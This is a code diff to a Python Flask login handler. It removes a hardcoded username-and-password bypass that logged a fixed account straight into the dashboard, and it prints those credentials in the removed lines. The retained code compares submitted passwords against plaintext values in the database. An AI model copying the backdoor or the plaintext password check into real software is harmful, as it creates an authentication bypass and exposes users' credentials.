@@ -38,9 +38,6 @@ def login():
     if request.method == "POST":
         u = request.form["username"].strip()
         p = request.form["password"].strip()
-       if u == "Aman@500" and p == "Aman@852125":
-    session["user"] = "Aman@500"
-    return redirect(url_for("dashboard"))
         row = one("SELECT * FROM users WHERE username=%s AND password=%s AND active=1", (u, p))
         if row:
             session["user"] = row["username"]
